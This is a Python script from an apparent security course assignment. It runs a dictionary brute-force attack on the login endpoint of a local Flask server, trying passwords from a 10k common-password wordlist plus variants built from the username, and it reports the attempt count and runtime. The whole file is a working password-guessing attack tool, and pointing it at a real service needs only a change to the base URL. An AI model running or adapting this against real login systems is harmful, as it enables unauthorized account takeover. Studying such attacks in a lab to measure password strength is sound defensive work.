"""
attack_bruteforce.py

Brute-force attack script for the assignment login server.

Script goals:
- Brute force attack on a single user(TARGET_USER) through HTTP to the FLask server.
- Use wordlist ("10k-most-common.txt")
- Create smart variatins of passwords by the username
- Measure attempt number and runtime.

The file assumes:
- Server is running local on BASE_URL
"""
import requests
import time
# ==================================
# =========== Config ===============
# ==================================
# Flask server address
BASE_URL = "http://127.0.0.1:5000"
# Wordlist file
WORDLIST_FILE = "10k-most-common.txt"
# User to excute the attack
TARGET_USER = "weak_user_1"
# Attempts number limit
MAX_ATTEMPTS = 50000
session = requests.Session()

# =========================================
# =========== HTTP helpers  ===============
# =========================================

def try_login(username: str, password: str):
    """
    Send POST/login request and return(status_code, json_data).
    If the server returns valid JSON, we will add as dict.

    :param username: Username we will try to login with.
    :param password: Password to check right now
    :return: tuple( status_code, data_dict)
    """
    url = f"{BASE_URL}/login"
    payload = {
        "username": username,
        "password": password
    }
    response = session.post(url, json=payload)
    try:
        data = response.json()
    except Exception:
        data = {"raw": response.text}
    return response.status_code, data

# =========================================
# =========== Candidates ==================
# =========================================
def username_parts(username: str) -> list[str]:
    """
    Split the username into logical parts.
    Example:
            "weak_user_9" -> ["weak", "user", "9"]

    :param username: Username
    :return: list of username parts (without empty string)
    """
    """Returns all parts in username
    # ["weak", "user", "9"]
    """
    u = username.replace("-", "_")
    return [p for p in u.split("_") if p]


def generate_candidates_for_word(username: str, base: str) -> list[str]:
    """
    Generate "smart" password candidates from a single word and a username.
    Example:
      recieves:
              - username ("weak_user_9)
              - base word from wordlist ("password")
      returns:
            weak_user_9password
            passwordweak_user_9
            weakpassword
            ...

    :param username: TARGET_USER
    :param base: Word from wordlist
    :return:  Possible password - username variations
    """
    """ Receives a username and a word from the wordlist and generate smart variations base on those"""
    base = base.strip()
    if not base:
        return []

    base_l = base.lower()
    parts = username_parts(username)
    first_part = parts[0] if parts else username

    candidates = {
        f"{username}{base_l}",  # weak_user_9password
        f"{base_l}{username}",  # passwordweak_user_9
        f"{first_part}{base_l}",  # weakpassword
        f"{base_l}{first_part}"  # passwordweak
    }
    return list(candidates)
# =========================================
# ================= Main ==================
# =========================================
def main():
    """
    Main brute force loop.

    Workflow:
        1. Print a start message including the target username and the wordlist file.
        2. Open a WORDLIST_FILE and iterate through each word:
            - First test the word itself as a password candidate.
            - Then, generate additional username-based variations using generate_candidates_for_word().
        3. Ensure that no password is tested more than once (using the 'seen' set).
        4. Stop the attack if:
            - MAX_ATTEMPTS is reached, or
            - A valid password is found (status == 200).
        5. At the end, print a summary indicating success or failure, along with the total runtime.
    """
    start_time = time.perf_counter()
    attempt_count = 0
    found = False

    print(f"[+] Starting brute force on user {TARGET_USER} using wordlist:{WORDLIST_FILE}")
    seen = set()  # We will not check the same password twice

    with open(WORDLIST_FILE, "r", encoding="utf-8") as f:
        for line in f:
            base_word = line.strip()
            if not base_word:
                continue
            # first:try the password from the wordlist as is
            candidates = [base_word]
            candidates.extend(generate_candidates_for_word(TARGET_USER, base_word))

            for pwd in candidates:
                if pwd in seen:
                    continue
                seen.add(pwd)

                attempt_count += 1
                if attempt_count > MAX_ATTEMPTS:
                    elapsed = time.perf_counter() - start_time
                    print("\n[!] Reached MAX_ATTEMPTS limit, stopping.")
                    print(f"[!] Brute force finished: no password for {TARGET_USER}")
                    print(f"[+] Total attempts: {attempt_count}")
                    print(f"[+] Total time:{elapsed:.2f} seconds")
                    return
                status, data = try_login(TARGET_USER, pwd)
                print(f"Attempt {attempt_count:5d}: password='{pwd}' -> {status}, {data}")
                time.sleep(
                    0.001)  # This line meant to prevent connection error when reaching max tcp connection(approx:16338)

                if status == 200:
                    elapsed = time.perf_counter() - start_time
                    print()
                    print(f"[+] SUCCESS! Found password for {TARGET_USER}: {pwd}")
                    print(f"[+] Total attempts: {attempt_count}")
                    print(f"[+] Total time:{elapsed:.2f} seconds")
                    found = True
                    break

            if found:
                break
    if not found:
        elapsed = time.perf_counter() - start_time
        print()
        print(f"[!] Brute force finished: no password for {TARGET_USER}")
        print(f"[!] Total attempts: {attempt_count}")
        print(f"[!] Total time:{elapsed:.2f} seconds")


if __name__ == "__main__":
    main()
